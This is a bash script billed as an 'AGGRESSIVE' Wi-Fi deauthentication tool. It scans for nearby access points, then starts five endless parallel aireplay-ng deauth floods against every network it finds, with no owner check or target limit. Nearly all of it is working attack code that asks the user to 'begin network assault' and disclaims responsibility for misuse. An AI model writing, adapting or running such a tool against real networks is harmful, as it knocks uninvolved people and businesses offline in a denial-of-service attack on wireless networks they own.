#!/bin/bash
sudo apt install aircrack-ng  xterm  

# Root check
if [[ $EUID -ne 0 ]]; then echo -e "\e[31m root accesss needed !\e[0m"; exit 1; fi

# Required tools
for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
  if ! command -v "$cmd" &>/dev/null; then echo -e "\e[31m $cmd not installed!\e[0m"; exit 1; fi
done

# Colors
RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m"; 
PURPLE="\e[35m"; BLUE="\e[34m"; RESET="\e[0m"; BOLD="\e[1m"

# Animations
attack_animation() {
    local i=0
    local frames=("💥" "🔥" "⚡" "💣")
    while true; do
        printf "\r${RED}${BOLD}%s ATTACK IN PROGRESS ${PURPLE}%s${RESET}" "${frames[$i]}" "${frames[$i]}"
        i=$(( (i+1) % 4))
        sleep 0.3
    done
}

# Header
clear
echo -e "${RED}${BOLD}"

echo -e "${RED}${BOLD}"
echo "          _________________      ________                             _____                "
echo "___      ____(_)__  __/__(_)     ______(_)_____ _______ __________ ______(_)_____________ _"
echo "__ | /| / /_  /__  /_ __  /___________  /_  __ \`/_  __ \`__ \\_  __ \`__ \\_  /__  __ \\_  __ \`/"
echo "__ |/ |/ /_  / _  __/ _  /_/_____/___  / / /_/ /_  / / / / /  / / / / /  / _  / / /  /_/ / "
echo "____/|__/ /_/  /_/    /_/        ___  /  \\__,_/ /_/ /_/ /_//_/ /_/ /_//_/  /_/ /_/_\\__, /  "
echo "                                 /___/                                            /____/   "

echo -e "================================================================================"
echo -e "${RESET}"
echo -e "${CYAN}AP-only focused, AGGRESSIVE deauth tool.${RESET}\n"
echo -e "${RED}${BOLD}⚠️  Disclaimer: ${Reset} I am not responsible for any misuse of this tool. "
echo -e "${Reset}                                                            by${BOLD}${GREEN} RAEF"
read -p "🔓 Press ENTER to begin network assault..."

# Interface selection
mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
[[ ${#interfaces[@]} -eq 0 ]] && echo -e "${RED}❌ No wireless interfaces found.${RESET}" && exit 1

echo -e "\n${YELLOW}${BOLD}Available Interfaces:${RESET}"
for i in "${!interfaces[@]}"; do echo -e " ${GREEN}[$i]${RESET} ${BLUE}${interfaces[$i]}${RESET}"; done
read -p "Select interface: " iface_idx
iface="${interfaces[$iface_idx]}"

# Monitor mode setup
echo -e "\n${CYAN}🔧 Configuring ${YELLOW}$iface${CYAN} for monitor mode...${RESET}"
airmon-ng check kill &>/dev/null
ip link set "$iface" down
iw dev "$iface" set type monitor
ip link set "$iface" up
iw dev "$iface" set power_save off

# Scan for networks with visible progress
scan_file="scan_$(date +%s)"
echo -e "\n${GREEN}📡 Scanning for targets - watch the scan window (10 seconds)...${RESET}"
echo -e "${YELLOW}The scan window will close automatically after 10 seconds.${RESET}"
sleep 2

# Run scan in visible xterm window
xterm -T "WiFi Scan" -geometry 100x30 -e "timeout 10s airodump-ng --write $scan_file --output-format csv $iface" &
scan_pid=$!

# Countdown timer
echo -ne "\r${CYAN}⏱️  Time remaining: 10 seconds${RESET}"
for i in {9..1}; do
    sleep 1
    echo -ne "\r${CYAN}⏱️  Time remaining: $i seconds${RESET}"
done
echo -e "\r${GREEN}✅ Scan complete - Targets acquired${RESET}"

# Parse APs
csv_file="${scan_file}-01.csv"
[[ ! -f "$csv_file" ]] && echo -e "${RED}❌ No networks detected.${RESET}" && exit 1

mapfile -t aps < <(awk -F',' '
  NR > 1 && $1 ~ /^[0-9A-F:]{17}$/ && $14 != "" {
    gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $4); gsub(/^ +| +$/, "", $14);
    print $1 "|" $4 "|" $14
  }' "$csv_file" 2>/dev/null)

[[ ${#aps[@]} -eq 0 ]] && echo -e "${RED}❌ No viable targets found.${RESET}" && exit 1

# Display target summary
echo -e "\n${PURPLE}${BOLD}🎯 Detected Targets:${RESET}"
echo -e "${YELLOW}-----------------------------------------------${RESET}"
printf "${BOLD}%-20s %-4s %s${RESET}\n" "BSSID" "CH" "ESSID"
for ap in "${aps[@]}"; do
    IFS='|' read -r bssid channel essid <<< "$ap"
    printf "%-20s %-4s %s\n" "$bssid" "$channel" "$essid"
done
echo -e "${YELLOW}-----------------------------------------------${RESET}"
echo -e "${RED}${BOLD}Total targets: ${#aps[@]}${RESET}"

# Trap cleanup
cleanup() {
    echo -e "\n${YELLOW}${BOLD} Terminating attacks and restoring network...${RESET}"
    killall aireplay-ng xterm &>/dev/null
    ip link set "$iface" down
    iw dev "$iface" set type managed
    ip link set "$iface" up
    service NetworkManager restart &>/dev/null
    rm -f "$csv_file" "$scan_file"-*
    echo -e "${GREEN}${BOLD} System restored. Operation complete.${RESET}"
    exit 0
}
trap cleanup INT

# Launch attacks
echo -e "\n${RED}${BOLD}💣 Initializing assault on ${#aps[@]} networks...${RESET}"
attack_animation &
attack_pid=$!

for ap in "${aps[@]}"; do
  IFS='|' read -r bssid channel essid <<< "$ap"
  iw dev "$iface" set channel "$channel"
  sanitized_essid="${essid//[^a-zA-Z0-9]/_}"
  
  # Launch 5 parallel deauth attacks per AP
  for i in {1..5}; do
    xterm -geometry 100x15 -bg black -fg red -T "BLASTING $essid" \
      -e "while true; do aireplay-ng --ignore-negative-one --deauth 0 -a $bssid $iface; sleep 0.5; done" &
    sleep 0.2
  done
done

echo -e "\r${RED}${BOLD}🔥 FULL SPECTRUM ASSAULT ACTIVE ${RESET}${PURPLE}${BOLD}🔥${RESET}"
echo -e "${YELLOW}${BOLD}Attacking ${#aps[@]} networks with ${#aps[@]}*5 attack channels${RESET}"
echo -e "\n${RED}${BOLD}🚫 PRESS CTRL+C TO STOP ATTACKS AND RESTORE NETWORK${RESET}"

# Main loop
while true; do
    sleep 1
done

# Clean up animation when done
kill $attack_pid
cleanup
